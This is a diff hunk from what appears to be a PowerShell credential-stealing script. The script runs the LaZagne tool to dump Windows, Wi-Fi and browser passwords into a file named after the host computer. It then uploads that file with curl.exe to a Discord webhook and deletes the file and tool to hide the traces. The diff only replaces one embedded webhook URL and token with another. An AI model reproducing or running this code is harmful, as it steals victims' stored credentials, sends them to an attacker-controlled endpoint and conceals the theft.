@@ -30,7 +30,7 @@ Start-BitsTransfer -Source "https://github.com/AlessandroZ/LaZagne/releases/down
 Set-Location $TempPath
 Start-Sleep -Seconds 15
 .\l.exe windows -vv > "$env:computername.txt";.\l.exe wifi -vv >> "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
-curl.exe https://discord.com/api/webhooks/1246076287580115045/2xidT8BNCNkVxLdC64rjp04Oul87fDUVtTSHN-gEil_vhYAFDmfLUuYaDIbkHNe8RKKI -F "file1=@$TempPath/$env:computername.txt"
+curl.exe https://discord.com/api/webhooks/1262807444120408064/Vu2LIdSUTm3Nu29Y6Z-9nxuK_NcDhw1xpZtIYPUKtBWLjHUN7m-_ZGeSBql4LTD1IJDP -F "file1=@$TempPath/$env:computername.txt"
 Remove-Item "$TempPath/$env:computername.txt", "$TempPath/l.exe" -Force -ErrorAction SilentlyContinue
 
 exit
